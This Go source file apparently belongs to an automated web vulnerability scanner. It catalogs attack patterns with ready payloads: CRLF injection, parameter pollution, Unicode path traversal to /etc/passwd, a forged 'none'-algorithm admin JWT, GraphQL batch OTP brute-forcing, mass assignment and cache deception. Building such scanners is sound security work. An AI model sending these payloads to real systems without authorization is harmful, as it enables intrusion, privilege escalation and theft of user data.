package agent

import (
	"fmt"
	"net/url"
	"strings"
)

// ZeroDayPattern describes a pattern for detecting novel/0-day vulnerability classes
// that go beyond standard OWASP testing.
type ZeroDayPattern struct {
	ID          string
	Name        string
	Category    string
	Description string
	Indicators  []string        // what to look for in recon data
	TestVectors []ZeroDayVector // how to probe
	Impact      string
	CWE         string
}

// ZeroDayVector is a single test vector for a zero-day pattern
type ZeroDayVector struct {
	Description string
	Method      string
	Headers     map[string]string
	PayloadFunc func(baseURL string) string
	SuccessIndicator string // substring in response body/header indicating success
}

// AllZeroDayPatterns is the full catalog of novel/advanced vulnerability patterns
var AllZeroDayPatterns = []ZeroDayPattern{
	{
		ID:       "http-request-splitting",
		Name:     "HTTP Request Splitting via CRLF Injection",
		Category: "Protocol",
		Description: "CRLF sequences in user-controlled headers split a single HTTP request into two, " +
			"potentially injecting a forged request or poisoning shared connection buffers.",
		Indicators: []string{"redirect", "location header", "url parameter", "custom headers"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "CRLF in redirect Location header",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "?url=%0d%0aSet-Cookie:%20pwned=1" },
				SuccessIndicator: "Set-Cookie: pwned",
			},
			{
				Description:      "CRLF via user-agent injection",
				Method:           "GET",
				Headers:          map[string]string{"User-Agent": "Mozilla\r\nX-Injected: value"},
				PayloadFunc:      func(base string) string { return base },
				SuccessIndicator: "X-Injected",
			},
		},
		Impact: "Session hijacking, cache poisoning, XSS via injected response",
		CWE:    "CWE-113",
	},
	{
		ID:       "parameter-pollution-chain",
		Name:     "HTTP Parameter Pollution → Authorization Bypass",
		Category: "Input Validation",
		Description: "Duplicate parameters exploiting discrepancies between frontend validation " +
			"(takes first) and backend processing (takes last) to bypass authorization checks.",
		Indicators: []string{"role=", "admin=", "user=", "permission=", "action="},
		TestVectors: []ZeroDayVector{
			{
				Description:      "Duplicate role parameter",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "&role=user&role=admin" },
				SuccessIndicator: "admin",
			},
			{
				Description:      "Array notation bypass",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "&role[]=admin" },
				SuccessIndicator: "admin",
			},
		},
		Impact:    "Authorization bypass, privilege escalation, admin access",
		CWE:       "CWE-235",
	},
	{
		ID:       "unicode-normalization-bypass",
		Name:     "Unicode Normalization → Path/Auth Bypass",
		Category: "Encoding",
		Description: "Unicode normalization (NFC/NFKC) transforms lookalike characters to their ASCII " +
			"equivalents after security checks, bypassing WAFs and authorization logic.",
		Indicators: []string{"path traversal protection", "input filtering", "allowlist"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "Unicode dot bypass for path traversal",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "/%EF%BC%8F..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd" },
				SuccessIndicator: "root:",
			},
			{
				Description:      "Unicode slash for WAF bypass",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "/admin\u2215panel" },
				SuccessIndicator: "admin",
			},
		},
		Impact:    "Path traversal, authentication bypass, WAF evasion",
		CWE:       "CWE-176",
	},
	{
		ID:       "jwt-algorithm-confusion",
		Name:     "JWT Algorithm Confusion (RS256 → HS256)",
		Category: "Cryptography",
		Description: "If a server uses RS256, an attacker can forge tokens by switching the algorithm " +
			"to HS256 and signing with the server's PUBLIC key (which is known).",
		Indicators: []string{"jwt", "bearer token", "authorization: bearer", "rsa", "public key"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "None algorithm bypass",
				Method:           "GET",
				Headers:          map[string]string{"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
				PayloadFunc:      func(base string) string { return base },
				SuccessIndicator: "admin",
			},
		},
		Impact:    "Complete authentication bypass, admin privilege escalation",
		CWE:       "CWE-347",
	},
	{
		ID:       "graphql-batching-bruteforce",
		Name:     "GraphQL Batching → Rate Limit Bypass Bruteforce",
		Category: "API Security",
		Description: "GraphQL batch queries allow sending N queries in a single HTTP request, " +
			"bypassing per-request rate limits to bruteforce OTPs, passwords, or tokens.",
		Indicators: []string{"graphql", "/graphql", "/api/graphql", "application/graphql"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "Batch OTP bruteforce test",
				Method:           "POST",
				Headers:          map[string]string{"Content-Type": "application/json"},
				PayloadFunc: func(base string) string {
					queries := make([]string, 10)
					for i := 0; i < 10; i++ {
						queries[i] = fmt.Sprintf(`{"query":"mutation{login(otp:\"%04d\"){token}}"}`, i*1000)
					}
					return "[" + strings.Join(queries, ",") + "]"
				},
				SuccessIndicator: "token",
			},
		},
		Impact:    "OTP bypass, password bruteforce, token enumeration",
		CWE:       "CWE-307",
	},
	{
		ID:       "race-condition-limit-bypass",
		Name:     "Race Condition → Single-Use Resource Consumption",
		Category: "Business Logic",
		Description: "Parallel requests exploit the window between a balance/validity check " +
			"and the corresponding deduction/invalidation (TOCTOU).",
		Indicators: []string{"coupon", "voucher", "redeem", "promo", "gift card", "balance", "withdraw", "transfer"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "Concurrent single-use token redemption",
				Method:           "POST",
				Headers:          map[string]string{"Content-Type": "application/json"},
				PayloadFunc:      func(base string) string { return base },
				SuccessIndicator: "success",
			},
		},
		Impact:    "Financial fraud, unlimited coupon usage, balance inflation",
		CWE:       "CWE-362",
	},
	{
		ID:       "mass-assignment-nested",
		Name:     "Nested Mass Assignment → Role/Permission Escalation",
		Category: "Access Control",
		Description: "Frameworks that auto-bind JSON body to model objects allow nested object " +
			"injection to modify protected fields like role, verified, admin.",
		Indicators: []string{"user update", "profile", "account", "patch", "put endpoint", "json body"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "Admin flag injection",
				Method:           "PUT",
				Headers:          map[string]string{"Content-Type": "application/json"},
				PayloadFunc:      func(base string) string { return `{"name":"test","role":"admin","is_admin":true,"permissions":["admin"]}` },
				SuccessIndicator: "admin",
			},
			{
				Description:      "Nested relationship injection",
				Method:           "PUT",
				Headers:          map[string]string{"Content-Type": "application/json"},
				PayloadFunc:      func(base string) string { return `{"user":{"role":"admin"},"__proto__":{"admin":true}}` },
				SuccessIndicator: "admin",
			},
		},
		Impact:    "Privilege escalation, account takeover, admin access",
		CWE:       "CWE-915",
	},
	{
		ID:       "ssrf-dns-rebinding",
		Name:     "SSRF via DNS Rebinding → Internal Service Access",
		Category: "SSRF",
		Description: "DNS rebinding causes a SSRF target to resolve to an internal IP on second DNS lookup, " +
			"bypassing IP allowlist checks that occur before the actual HTTP request.",
		Indicators: []string{"url parameter", "webhook", "fetch", "proxy", "callback", "dns"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "DNS rebinding via time-based TTL",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base },
				SuccessIndicator: "internal",
			},
		},
		Impact:    "Internal service SSRF, cloud metadata access, RCE via internal APIs",
		CWE:       "CWE-918",
	},
	{
		ID:       "web-cache-deception",
		Name:     "Web Cache Deception → Session/PII Theft",
		Category: "Caching",
		Description: "Tricking a cache server into storing authenticated responses as public cache entries " +
			"by appending a static file extension to authenticated endpoints.",
		Indicators: []string{"cache", "cdn", "nginx", "varnish", "cloudflare", "user profile", "account"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "Static extension appended to auth endpoint",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "/account.css" },
				SuccessIndicator: "X-Cache: HIT",
			},
			{
				Description:      "Directory traversal to authenticated profile",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "/nonexistent/../profile.jpg" },
				SuccessIndicator: "X-Cache: HIT",
			},
		},
		Impact:    "Session token theft, PII exfiltration from other users' authenticated responses",
		CWE:       "CWE-525",
	},
	{
		ID:       "iframe-sandbox-escape",
		Name:     "Iframe Sandbox Attribute Misconfiguration",
		Category: "DOM/Client",
		Description: "Missing or overly permissive sandbox attributes on iframes allow the embedded " +
			"content to access parent frame data, cookies, or run scripts.",
		Indicators: []string{"iframe", "embed", "sandbox", "allow-scripts", "postmessage"},
		TestVectors: []ZeroDayVector{
			{
				Description:      "Missing sandbox on iframe with user-controlled src",
				Method:           "GET",
				PayloadFunc:      func(base string) string { return base + "?src=javascript:alert(document.cookie)" },
				SuccessIndicator: "document.cookie",
			},
		},
		Impact:    "XSS, session theft, cross-origin data exfiltration",
		CWE:       "CWE-1021",
	},
}

// MatchPatterns returns zero-day patterns relevant to the given set of recon leads
func MatchPatterns(leads []string, techStack *TechStack) []ZeroDayPattern {
	leadText := strings.ToLower(strings.Join(leads, " "))
	techText := ""
	if techStack != nil {
		techText = strings.ToLower(fmt.Sprintf("%s %s %s",
			techStack.Lang, strings.Join(techStack.Frameworks, " "), techStack.DB))
	}
	combined := leadText + " " + techText

	var matched []ZeroDayPattern
	for _, p := range AllZeroDayPatterns {
		for _, ind := range p.Indicators {
			if strings.Contains(combined, ind) {
				matched = append(matched, p)
				break
			}
		}
	}
	return matched
}

// BuildZeroDayProbeURLs returns URLs to probe for a given pattern and base URL
func BuildZeroDayProbeURLs(pattern ZeroDayPattern, baseURL string) []string {
	u, err := url.Parse(baseURL)
	if err != nil {
		return nil
	}
	base := fmt.Sprintf("%s://%s", u.Scheme, u.Host)

	var urls []string
	for _, v := range pattern.TestVectors {
		if v.PayloadFunc != nil {
			urls = append(urls, v.PayloadFunc(base))
		}
	}
	return urls
}
